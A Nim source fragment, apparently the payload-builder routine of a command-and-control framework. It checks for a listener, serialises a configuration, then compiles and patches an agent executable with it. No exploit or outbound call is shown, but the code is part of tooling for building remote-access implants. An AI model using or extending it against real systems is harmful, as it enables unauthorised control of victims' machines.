    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Agent type: {agentBuildInformation.agentType}", clientId = clientId)

    case agentBuildInformation.agentType:
    of AGENT_IMPERATOR:
        return cq.imperatorAgentBuild(agentBuildInformation, clientId)

    of AGENT_MONARCH:
        if not cq.dbListenerExists(agentBuildInformation.listenerId):
            cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
            return

        let listener = cq.listeners[agentBuildInformation.listenerId]
        var config = cq.serializeConfiguration(agentBuildInformation, listener, clientId)

        let unpatchedExePath = cq.compile(config.len(), agentBuildInformation, listener, clientId)
        if unpatchedExePath.isEmptyOrWhitespace():
            return

        return (unpatchedExePath.extractFilename(), cq.patch(unpatchedExePath, config, clientId))
